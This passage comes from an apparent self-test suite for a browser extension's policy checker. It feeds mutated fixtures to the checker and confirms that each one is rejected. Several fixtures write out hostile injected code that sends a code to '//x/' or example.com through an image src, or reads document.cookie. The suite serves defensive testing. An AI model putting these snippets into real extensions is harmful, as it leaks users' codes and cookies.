    appendJs('lib/autofill-worker.js', "fillFocused = (code) => { document.querySelector('img').src = '//x/?c=' + code; };\n"),
    ['content-script-sinks'],
    /fillFocused named other than in its one top-level declaration/,
  ],
  ['injected-compound-assigned', appendJs('lib/autofill-worker.js', 'fillFocused ||= grab;\n'), ['content-script-sinks'], /fillFocused named other than/],
  ['injected-redeclared-var', appendJs('lib/autofill-worker.js', 'var fillFocused = grab;\n'), ['content-script-sinks'], /fillFocused named other than/],
  ['injected-redeclared-let', appendJs('lib/autofill-worker.js', 'let fillFocused = grab;\n'), ['content-script-sinks'], /fillFocused named other than/],
  ['injected-redeclared-const-list', appendJs('lib/autofill-worker.js', 'const other = 1, fillFocused = grab;\n'), ['content-script-sinks'], /fillFocused named other than/],
  ['injected-redeclared-class', appendJs('lib/autofill-worker.js', 'class fillFocused {}\n'), ['content-script-sinks'], /fillFocused named other than/],
  ['injected-redeclared-import', editWorker("import { openOwnWindow } from './nav.js';", "import { openOwnWindow, openOwnWindow as fillFocused } from './nav.js';"), ['content-script-sinks'], /fillFocused named other than/],
  ['injected-destructured-rebind', appendJs('lib/autofill-worker.js', '[fillFocused] = [grab];\n'), ['content-script-sinks'], /fillFocused named other than/],
  // fillFocused may stand as func: only inside the options literal of an executeScript call; a
  // func: fillFocused in a destructuring pattern rebinds it (round-2 reviewer mutation, verbatim).
  [
    'injected-destructured-func-key',
    appendJs(
      'lib/autofill-worker.js',
      "const replacement = {\n  [`func`]: (code) => {\n    document.querySelector('img').src = '//example.com/?code=' + code;\n  }\n};\n({ func: fillFocused } = replacement);\n",
    ),
    ['content-script-sinks'],
    /fillFocused named other than in its one top-level declaration and as the func: of an executeScript call/,
  ],
  ['injected-destructured-func-key-plain-object', appendJs('lib/autofill-worker.js', '({ func: fillFocused } = replacement);\n'), ['content-script-sinks'], /fillFocused named other than in its one top-level declaration/],
  ['injected-destructured-array-x', appendJs('lib/autofill-worker.js', '[fillFocused] = [x];\n'), ['content-script-sinks'], /fillFocused named other than/],
  [
    'injected-shadowed-const-destructure',
    editWorker('  const frameIds = [info.frameId ?? 0];', '  const frameIds = [info.frameId ?? 0];\n  const { func: fillFocused } = x;'),
    ['content-script-sinks'],
    /fillFocused named other than/,
  ],
  ['injected-shadowed-param-destructure', editWorker('export async function handleMenuClick(info, tab) {', 'export async function handleMenuClick(info, tab, { func: fillFocused } = x) {'), ['content-script-sinks'], /fillFocused named other than/],
  ['injected-destructured-for-of', appendJs('lib/autofill-worker.js', 'for ({ func: fillFocused } of list) break;\n'), ['content-script-sinks'], /fillFocused named other than/],
  // The func: value is authorized only as a whole value of the call's own options literal.
  ['injected-func-value-assignment', editInjection("await chrome.scripting.executeScript({ target: { tabId: tab.id, frameIds }, func: fillFocused = grab, args: ['123456'] });"), ['content-script-sinks'], /fillFocused named other than/],
  [
    'injected-func-in-nested-pattern',
    editInjection("await chrome.scripting.executeScript({ target: { tabId: tab.id, frameIds }, func: fillFocused, args: [({ func: fillFocused } = replacement)] });"),
    ['content-script-sinks'],
    /fillFocused named other than/,
  ],
  // In a scripting file a computed key or member access is never spelled with a string or a
  // template: it would name func, js or chrome where the checks read them only by spelling.
  ['scripting-template-computed-key', appendJs('lib/autofill-worker.js', 'const replacement = { [`func`]: grab };\n'), ['content-script-sinks'], /computed key with a string or template key in a scripting file/],
  ['scripting-string-computed-key', appendJs('lib/autofill-worker.js', "const replacement = { ['fu' + 'nc']: grab };\n"), ['content-script-sinks'], /computed key with a string or template key in a scripting file/],
  ['scripting-string-computed-pattern-key', appendJs('lib/autofill-worker.js', "const { ['func']: pick } = replacement;\n"), ['content-script-sinks'], /computed key with a string or template key in a scripting file/],
  ['scripting-string-member-access', appendJs('lib/autofill-worker.js', "export const api = () => globalThis['chr' + 'ome'];\n"), ['navigation', 'content-script-sinks'], /computed member access with a string or template key in a scripting file/],
  ['scripting-string-member-write', appendJs('lib/autofill-worker.js', "export function widen(options) { options['fu' + 'nc'] = grab; }\n"), ['content-script-sinks'], /computed member access with a string or template key in a scripting file/],
  ['ok-scripting-string-arrays-and-identifier-keys', appendJs('lib/autofill-worker.js', "const MODES = ['a', `b`];\nconst pairs = [['k', 1], ['l', 2]];\nexport const pick = (o, key) => o[key] ?? MODES[0] ?? pairs[1];\n"), []],
  ['injected-shadowed-param', editWorker('export async function handleMenuClick(info, tab) {', 'export async function handleMenuClick(info, tab, fillFocused = grab) {'), ['content-script-sinks'], /fillFocused named other than/],
  [
    'injected-shadowed-local',
    editWorker('  const frameIds = [info.frameId ?? 0];', "  const frameIds = [info.frameId ?? 0];\n  const fillFocused = (code) => { document.querySelector('img').src = '//x/?c=' + code; };"),
    ['content-script-sinks'],
    /fillFocused named other than/,
  ],
  [
    'injected-shadowed-nested-declaration',
    editWorker('  const frameIds = [info.frameId ?? 0];', '  const frameIds = [info.frameId ?? 0];\n  function fillFocused(code) { return code; }'),
    ['content-script-sinks'],
    /function fillFocused is not a top-level function declaration/,
  ],
  ['injected-function-expression', editWorker('function fillFocused(code) {', 'const holder = function fillFocused(code) {'), ['content-script-sinks'], /function fillFocused is not a top-level function declaration/],
  [
    'injected-in-block',
    (fx) => {
      editWorker('function fillFocused(code) {', '{\nfunction fillFocused(code) {')(fx);
      appendJs('lib/autofill-worker.js', '}\n')(fx);
    },
    ['content-script-sinks'],
    /function fillFocused is not a top-level function declaration/,
  ],
  ['ok-injected-async-export', editWorker('function fillFocused(code) {', 'export async function fillFocused(code) {'), []],
  ['ok-injected-name-as-member', appendJs('lib/autofill-worker.js', 'export const names = { list: [] };\nnames.fillFocused = 1;\n'), []],
  // fillFocused may read location.origin (it checks the frame's origin before it writes); a write
  // to it or to another part of location fails, and so does .origin anywhere else.
  [
    'ok-injected-location-origin-read',
    (fx) => {
      editWorker('function fillFocused(code) {', 'function fillFocused(code, expected) {\n  if (location.origin !== expected) return false;')(fx);
      editWorker("args: ['123456'] }", "args: ['123456', info.frameId] }")(fx);
    },
    [],
  ],
  ['injected-location-href-write', editWorker('function fillFocused(code) {', "function fillFocused(code) {\n  location.href = '/next?c=' + code;"), ['navigation', 'content-script-sinks'], /\.href is not on the content-script member list \(in injected fillFocused\)/],
  ['injected-location-origin-write', editWorker('function fillFocused(code) {', 'function fillFocused(code) {\n  location.origin = code;'), ['content-script-sinks'], /write to location\.origin \(it may only be read\) \(in injected fillFocused\)/],
  ['injected-location-origin-increment', editWorker('function fillFocused(code) {', 'function fillFocused(code) {\n  ++location.origin;'), ['content-script-sinks'], /write to location\.origin/],
  ['injected-origin-not-location', editWorker('function fillFocused(code) {', 'function fillFocused(code) {\n  const here = el.origin;'), ['content-script-sinks'], /\.origin is not on the content-script member list \(in injected fillFocused\)/],
  ['injected-window-location-origin', editWorker('function fillFocused(code) {', 'function fillFocused(code) {\n  const here = window.location.origin;'), ['content-script-sinks'], /\.location is not on the content-script member list \(in injected fillFocused\)/],
  ['content-location-origin', appendContent('const here = location.origin;\n'), ['content-script-sinks'], /\.origin is not on the content-script member list/],
  // executeScript takes its options as one object literal written in the call: target (an object
  // literal of tabId and frameIds), func (a pinned name, required) and args. Options built
  // elsewhere could carry a func or files the name checks never see.
  [
    'ok-executescript-real-worker-shape',
    both(
      editInjection('const results = await chrome.scripting.executeScript({\n    target: { tabId, frameIds: [Number.isInteger(info.frameId) ? info.frameId : 0] },\n    func: fillFocused,\n    args: [code, expected],\n  });'),
      editWorker('function fillFocused(code) {', 'function fillFocused(code, expected) {\n  if (location.origin !== expected) return false;'),
    ),
    [],
  ],
  ['ok-executescript-args-shorthand-quoted-func', editInjection("const args = ['123456'];\n  await chrome.scripting?.executeScript?.({ target: { tabId: tab.id, frameIds }, 'func': fillFocused, args, });"), []],
  [
    'executescript-options-computed-key',
    both(editInjection("const options = { target: { tabId: tab.id, frameIds }, args: ['123456'] };\n  options['fu' + 'nc'] = grab;\n  await chrome.scripting.executeScript(options);"), appendGrab),
    ['content-script-sinks'],
    /chrome\.scripting\.executeScript takes other than one object literal written in the call/,
  ],
  [
    'executescript-computed-key-in-literal',
    both(editInjection("await chrome.scripting.executeScript({ target: { tabId: tab.id, frameIds }, ['fu' + 'nc']: grab, args: ['123456'] });"), appendGrab),
    ['content-script-sinks'],
    /executeScript options has a spread, computed key or method/,
  ],
  [
    'executescript-imported-options',
    both(importInWorker('injection'), editInjection("await chrome.scripting.executeScript(injection(tab.id, '123456'));")),
    ['content-script-sinks'],
    /executeScript takes other than one object literal written in the call/,
  ],
  ['executescript-imported-identifier', both(importInWorker('injection'), editInjection('await chrome.scripting.executeScript(injection);')), ['content-script-sinks'], /executeScript takes other than one object literal/],
  [
    'executescript-imported-spread',
    both(importInWorker('injection'), editInjection("await chrome.scripting.executeScript({ target: { tabId: tab.id, frameIds }, func: fillFocused, args: ['123456'], ...injection });")),
    ['content-script-sinks'],
    /executeScript options has a spread, computed key or method/,
  ],
  [
    'executescript-fromentries',
    both(editInjection("await chrome.scripting.executeScript(Object.fromEntries([['target', { tabId: tab.id }], ['fu' + 'nc', grab]]));"), appendGrab),
    ['content-script-sinks'],
    /executeScript takes other than one object literal/,
  ],
  ['executescript-method-func', editInjection("await chrome.scripting.executeScript({ target: { tabId: tab.id, frameIds }, func() { return document.cookie; } });"), ['content-script-sinks'], /executeScript options has a spread, computed key or method/],
  ['executescript-world-main', editInjection("await chrome.scripting.executeScript({ target: { tabId: tab.id, frameIds }, func: fillFocused, args: ['123456'], world: 'MAIN' });"), ['content-script-sinks'], /executeScript options key world is not one of target, func, args/],
  ['executescript-target-all-frames', editInjection("await chrome.scripting.executeScript({ target: { tabId: tab.id, allFrames: true }, func: fillFocused, args: ['123456'] });"), ['content-script-sinks'], /executeScript target key allFrames is not one of tabId, frameIds/],
  ['executescript-target-variable', editInjection("await chrome.scripting.executeScript({ target: where, func: fillFocused, args: ['123456'] });"), ['content-script-sinks'], /executeScript target: is not an object literal/],
  ['executescript-target-shorthand', editInjection("await chrome.scripting.executeScript({ target, func: fillFocused, args: ['123456'] });"), ['content-script-sinks'], /executeScript options key target written as shorthand/],
  ['executescript-target-spread', editInjection("await chrome.scripting.executeScript({ target: { ...where }, func: fillFocused, args: ['123456'] });"), ['content-script-sinks'], /executeScript target has a spread/],
  ['executescript-without-func', editInjection("await chrome.scripting.executeScript({ target: { tabId: tab.id, frameIds }, args: ['123456'] });"), ['content-script-sinks'], /executeScript without func:/],
  ['executescript-duplicate-key', editInjection("await chrome.scripting.executeScript({ target: { tabId: tab.id, frameIds }, func: fillFocused, args: ['123456'], args: extra });"), ['content-script-sinks'], /executeScript options key args given twice/],
  ['executescript-second-argument', editInjection("await chrome.scripting.executeScript({ target: { tabId: tab.id, frameIds }, func: fillFocused, args: ['123456'] }, extra);"), ['content-script-sinks'], /executeScript takes other than one object literal/],
  ['executescript-method-reference', appendJs('lib/autofill-worker.js', 'const run = chrome.scripting.executeScript;\n'), ['content-script-sinks'], /chrome\.scripting\.executeScript other than called directly/],
  [
    'executescript-call-method',
    // chrome.scripting passed as `this` is also an alias.
    editInjection("await chrome.scripting.executeScript.call(chrome.scripting, { target: { tabId: tab.id, frameIds }, func: fillFocused, args: ['123456'] });"),
    ['scripting-api', 'content-script-sinks'],
    /chrome\.scripting\.executeScript other than called directly/,
  ],
  // registerContentScripts and updateContentScripts take one array literal of object literals, or
  // of one const holding one that nothing else touches; each has a js: key and registrationKeys only.
  [
    'ok-registration-inline-literals',
    both(
      editWorker(`  const script = ${REGISTRATION_OBJECT};\n`, ''),
      editWorker('updateContentScripts([script])', "updateContentScripts([{ id: 'autofill', matches, js: CONTENT_SCRIPTS }])"),
      editWorker('registerContentScripts([script])', `registerContentScripts([${REGISTRATION_OBJECT}])`),
    ),
    [],
  ],
  ['registration-array-variable', editWorker('registerContentScripts([script])', 'registerContentScripts(scripts)'), ['content-script-sinks'], /registerContentScripts takes other than one array literal/],
  ['registration-call-result', editWorker('registerContentScripts([script])', 'registerContentScripts(build(matches))'), ['content-script-sinks'], /registerContentScripts takes other than one array literal/],
  ['registration-imported-object', both(importInWorker('registration'), editWorker('registerContentScripts([script])', 'registerContentScripts([registration])')), ['content-script-sinks'], /registerContentScripts item is not an object literal or a const holding one/],
  ['registration-array-spread', editWorker('registerContentScripts([script])', 'registerContentScripts([...extra])'), ['content-script-sinks'], /registerContentScripts item is not an object literal or a const holding one/],
  ['registration-object-spread', editWorker('updateContentScripts([script])', 'updateContentScripts([{ ...base, js: CONTENT_SCRIPTS }])'), ['content-script-sinks'], /content-script registration has a spread, computed key or method/],
  ['registration-computed-key', editWorker('runAt: \'document_idle\', persistAcrossSessions', "runAt: 'document_idle', ['wor' + 'ld']: 'MAIN', persistAcrossSessions"), ['content-script-sinks'], /content-script registration has a spread, computed key or method/],
  ['registration-world-key', editWorker('persistAcrossSessions: true }', "persistAcrossSessions: true, world: 'MAIN' }"), ['content-script-sinks'], /content-script registration key world is not one of/],
  ['registration-match-origin-fallback', editWorker('persistAcrossSessions: true }', 'persistAcrossSessions: true, matchOriginAsFallback: true }'), ['content-script-sinks'], /content-script registration key matchOriginAsFallback is not one of/],
  ['registration-update-without-js', editWorker('updateContentScripts([script])', "updateContentScripts([{ id: 'autofill', matches }])"), ['content-script-sinks'], /content-script registration without a js: key/],
  ['registration-object-const-mutated', editWorker('  if (matches.length === 0 && current)', "  script.world = 'MAIN';\n  if (matches.length === 0 && current)"), ['content-script-sinks'], /script \(a content-script registration\) named other than/],
  ['registration-const-object-assign', editWorker('  if (matches.length === 0 && current)', "  Object.assign(script, { world: 'MAIN' });\n  if (matches.length === 0 && current)"), ['content-script-sinks'], /script \(a content-script registration\) named other than/],
  ['registration-const-mapped', editWorker('registerContentScripts([script])', 'registerContentScripts([script].map((s) => s))'), ['content-script-sinks'], /registerContentScripts takes other than one array literal/],
  ['registration-const-not-literal', editWorker(`const script = ${REGISTRATION_OBJECT};`, `const script = Object.assign(${REGISTRATION_OBJECT}, extra);`), ['content-script-sinks'], /item is not an object literal or a const holding one/],
  ['registration-let-object', editWorker(`const script = ${REGISTRATION_OBJECT};`, `let script = ${REGISTRATION_OBJECT};`), ['content-script-sinks'], /item is not an object literal or a const holding one/],
  ['registration-method-reference', appendJs('lib/autofill-worker.js', 'const register = chrome.scripting.registerContentScripts;\n'), ['content-script-sinks'], /chrome\.scripting\.registerContentScripts other than called directly/],

  ['inline-script-body', addHtml('<script>document.title = 1;</script>'), ['inline-script']],
  [
    'inline-onclick',
    (fx) => (fx.files['popup/popup.html'] = fx.files['popup/popup.html'].replace('type="button"', 'type="button" onclick="x()"')),
    ['inline-script'],
  ],
  [
    'locales-url',
    (fx) => (fx.files['_locales/en/messages.json'] = JSON.stringify({ help: { message: 'see https://example.com' } })),
    ['locales-url'],
  ],
  [
    'vendor-tampered',
    (fx) => {
      fx.tamper = ['vendor/jsQR.js', 'export default function jsQR() { return 1; }\n'];
    },
    ['vendor-sums'],
  ],
  [
    'vendor-unlisted-file',
    (fx) => {
      fx.tamper = ['vendor/extra.json', '{}\n'];
    },
    ['vendor-sums'],
  ],
  [
    'vendor-listed-missing',
    (fx) => {
      fx.tamper = ['vendor/jsQR.js', null];
    },
    ['vendor-sums'],
  ],
  ['vendor-no-sums', (fx) => (fx.sums = null), ['vendor-sums']],
  // A second entry for the same name must not win (or lose) silently.
  ['vendor-sums-duplicate-line', editSums((text, hash) => `${text}${hash}  jsQR.js\n`), ['vendor-sums'], /again/],
  ['vendor-sums-duplicate-wrong-last', editSums((text) => `${text}${WRONG_HASH}  jsQR.js\n`), ['vendor-sums'], /again/],
  ['vendor-sums-duplicate-wrong-first', editSums((text) => `${WRONG_HASH}  jsQR.js\n${text}`), ['vendor-sums'], /again/],
  // Only sha256sum's own output form: other spellings of a vendored name used to be rewritten
  // to it (so ./x, vendor/x and a/../x all named vendor/x); each is now refused as it stands.
  ['vendor-sums-dot-slash', editSums((text, hash) => text.replace(`${hash}  jsQR.js`, `${hash}  ./jsQR.js`)), ['vendor-sums'], /not canonical/],
  ['vendor-sums-vendor-prefix', editSums((text, hash) => text.replace(`${hash}  jsQR.js`, `${hash} *vendor/jsQR.js`)), ['vendor-sums'], /not canonical/],
  ['vendor-sums-dot-segments', editSums((text, hash) => text.replace(`${hash}  jsQR.js`, `${hash}  sub/../jsQR.js`)), ['vendor-sums'], /not canonical/],
  ['vendor-sums-backslash', editSums((text, hash) => text.replace(`${hash}  jsQR.js`, `${hash}  sub\\..\\jsQR.js`)), ['vendor-sums'], /not canonical/],
  ['vendor-sums-empty-segment', editSums((text, hash) => text.replace(`${hash}  jsQR.js`, `${hash}  sub//../jsQR.js`)), ['vendor-sums'], /not canonical/],
  ['vendor-sums-absolute', editSums((text) => `${text}${WRONG_HASH}  /etc/passwd\n`), ['vendor-sums'], /not canonical/],
  ['vendor-sums-outside-vendor', editSums((text) => `${text}${WRONG_HASH}  ../manifest.json\n`), ['vendor-sums'], /not canonical/],
  ['vendor-sums-uppercase-hex', editSums((text, hash) => text.replace(hash, hash.toUpperCase())), ['vendor-sums'], /not canonical/],
  ['vendor-sums-crlf', editSums((text) => text.replace(/\n/g, '\r\n')), ['vendor-sums'], /not canonical/],
  ['vendor-sums-blank-line', editSums((text) => `${text}   \n`), ['vendor-sums'], /not canonical/],
  ['vendor-sums-single-space', editSums((text, hash) => text.replace(`${hash}  jsQR.js`, `${hash} jsQR.js`)), ['vendor-sums'], /not canonical/],
  ['vendor-js-without-license', addJs('vendor/extra.js', 'export default 1;\n'), ['vendor-license']],
  [
    'vendor-license-misnamed',
    (fx) => {
      delete fx.files['vendor/jsQR.LICENSE'];
      fx.files['vendor/jsQR.js.LICENSE'] = 'Apache License 2.0 (fixture)\n';
    },
    ['vendor-license'],
  ],
  [
    'ok-vendor-nested-license',
    (fx) => {
      fx.files['vendor/sub/lib.js'] = 'export default 2;\n';
      fx.files['vendor/sub/lib.LICENSE'] = 'MIT (fixture)\n';
    },
    [],
  ],
  [
    'vendor-malformed-sums',
    (fx) => {
      fx.sums = 'not-a-hash  jsQR.js\n';
    },
    ['vendor-sums'],
  ],
];

// `text` with `from` replaced by `to`; throws unless `from` occurs exactly once, so a case cannot
// silently stop changing what it claims to change when the source it edits moves on.
function replacedOnce(text, from, to) {
  const count = text.split(from).length - 1;
  if (count !== 1) throw new Error(`self-test fixture: expected ${JSON.stringify(from)} once, found ${count}`);
  return text.replace(from, () => to);
}

function buildCase(dir, mutate) {
  const fx = cleanFixture();
  mutate(fx);
  const comment = fx.sums === 'comment';
  if (comment) fx.sums = 'auto';
  writeFixture(dir, fx);
  const sumsFile = path.join(dir, SUMS_PATH);
  if (comment) {
    const sums = fs.readFileSync(sumsFile, 'utf8');
    fs.writeFileSync(sumsFile, `# jsQR, pinned upstream build\n${sums}`);
  }
  if (fx.sumsEdit) {
    const text = fs.readFileSync(sumsFile, 'utf8');
    const jsqrHash = text.match(/^([0-9a-f]{64}) {2}jsQR\.js$/m)[1];
    fs.writeFileSync(sumsFile, fx.sumsEdit(text, jsqrHash));
  }
  if (fx.tamper) {
    // Applied after SHA256SUMS was written, so the listed hashes describe the original files.
    const [rel, content] = fx.tamper;
    if (content === null) fs.rmSync(path.join(dir, rel));
    else fs.writeFileSync(path.join(dir, rel), content);
  }
}

function runCli(script, args) {
  return spawnSync(process.execPath, [script, ...args], { encoding: 'utf8', env: { ...process.env, ZAUTH_POLICY_NESTED: '1' } });
}

function selfTest() {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'zauth-policy-selftest-'));
  let failures = 0;
  let total = 0;
  const report = (ok, name, detail) => {
    total += 1;
    if (!ok) failures += 1;
    console.log(`${ok ? 'PASS' : 'FAIL'} self-test:${name} ${detail}`);
  };
  try {
    // The policy constants equal the hand-written copy, and the comparison notices each edit.
    const pinDiff = policyDifferences(MANIFEST_POLICY, PINNED_POLICY);
    report(pinDiff.length === 0, 'policy-pin', pinDiff.length === 0 ? 'MANIFEST_POLICY equals PINNED_POLICY' : pinDiff.join('; '));
    for (const [field, mutate] of PIN_MUTATIONS) {
      const copy = structuredClone(PINNED_POLICY);
      mutate(copy);
      const diff = policyDifferences(MANIFEST_POLICY, copy);
      report(diff.length > 0 && diff.every((d) => d.startsWith(field)), `policy-pin-detects-${field}`, diff.join('; ') || 'no difference reported');
    }
    // The clean fixture's lib/nav.js is the pinned file, so the cases below test the real wrapper.
    const fixtureNav = sha256Of(Buffer.from(NAV_WRAPPER_SOURCE));
    report(
      fixtureNav === MANIFEST_POLICY.navWrapperSha256,
      'nav-wrapper-fixture-pin',
      `NAV_WRAPPER_SOURCE sha256 ${fixtureNav} ${fixtureNav === MANIFEST_POLICY.navWrapperSha256 ? '==' : '!='} navWrapperSha256`,
    );

    // A case may also name the reason: a pattern at least one failing rule's detail must match,
    // so a fixture that fails for some other reason (a missing file, say) does not count.
    for (const [name, mutate, expected, reason] of CASES) {
      const dir = path.join(root, name);
      buildCase(dir, mutate);
      const results = runChecks(dir);
      const failing = results.filter((r) => !r.ok);
      const failed = failing.map((r) => r.rule);
      const missing = RULES.filter((rule) => !results.some((r) => r.rule === rule));
      const ok =
        missing.length === 0 &&
        failed.length === expected.length &&
        expected.every((rule) => failed.includes(rule)) &&
        (!reason || failing.some((r) => reason.test(r.detail)));
      const why = failing.map((r) => `${r.rule}: ${r.detail}`).join(' | ');
      const want = `expected FAIL [${expected.join(', ')}]${reason ? ` matching ${reason}` : ''}`;
      report(ok, name, `${want} got FAIL [${failed.join(', ')}]${why ? ` (${why})` : ''}`);
    }

    // The CLI itself: exit codes, one line per rule, and a clean message when extension/ is absent.
    const clean = runCli(SCRIPT, ['--ext', path.join(root, 'clean')]);
    const cleanLines = clean.stdout.trim().split('\n');
    report(
      clean.status === 0 && cleanLines.length === RULES.length && cleanLines.every((l) => l.startsWith('PASS ')),
      'cli-clean',
      `exit ${clean.status}, ${cleanLines.length} PASS lines`,
    );
    const bad = runCli(SCRIPT, ['--ext', path.join(root, 'net-fetch')]);
    report(
      bad.status === 1 && bad.stdout.split('\n').some((l) => l.startsWith('FAIL network-api ')),
      'cli-violation',
      `exit ${bad.status}, ${bad.stdout.split('\n').find((l) => l.startsWith('FAIL')) ?? '(no FAIL line)'}`,
    );
    const absent = runCli(SCRIPT, ['--ext', path.join(root, 'does-not-exist')]);
    report(
      absent.status === 1 && /^FAIL extension-dir /.test(absent.stdout) && absent.stderr.trim() === '',
      'cli-missing-extension',
      `exit ${absent.status}, ${absent.stdout.trim().replace(root, '<tmp>')}, stderr ${JSON.stringify(absent.stderr.trim())}`,
    );

    // Widening MANIFEST_POLICY alone (not PINNED_POLICY) must make the whole self-test fail.
    // Runs a copy of this script with one permission added; skipped inside that copy.
    if (process.env.ZAUTH_POLICY_NESTED !== '1') {
      const source = fs.readFileSync(SCRIPT, 'utf8');
      // Assembled so that this line does not itself contain the text it looks for.
      const needle = ['allowedPermissions: [', "'storage', 'activeTab', 'contextMenus', 'scripting'", '],'].join('');
      const count = source.split(needle).length - 1;
      if (count !== 1) {
        report(false, 'cli-policy-edit-fails-self-test', `expected the MANIFEST_POLICY line ${JSON.stringify(needle)} exactly once, found ${count}`);
      } else {
        const widened = path.join(root, 'widened-policy.mjs');
        fs.writeFileSync(widened, source.replace(needle, needle.replace("'scripting'", "'scripting', 'tabs'")));
        const run = runCli(widened, ['--self-test']);
        const pinLine = run.stdout.split('\n').find((l) => l.includes('self-test:policy-pin ')) ?? '(no policy-pin line)';
        report(
          run.status === 1 && pinLine.startsWith('FAIL '),
          'cli-policy-edit-fails-self-test',
          `copy with 'tabs' allowed: exit ${run.status}, ${pinLine}`,
        );
      }
    }
  } finally {
    fs.rmSync(root, { recursive: true, force: true });
  }
  console.log(`${failures === 0 ? 'PASS' : 'FAIL'} self-test ${total - failures}/${total} cases`);
  process.exitCode = failures === 0 ? 0 : 1;
}

function main(argv) {
  if (argv[0] === '--self-test' && argv.length === 1) return selfTest();
  let extDir = path.join(REPO_ROOT, 'extension');
  if (argv[0] === '--ext' && argv.length === 2) extDir = path.resolve(argv[1]);
  else if (argv.length > 0) {
    console.error('usage: check-policy.mjs [--ext <extension dir>] | --self-test');
    process.exitCode = 2;
    return;
  }
  printAndExit(runChecks(extDir));
}

main(process.argv.slice(2));
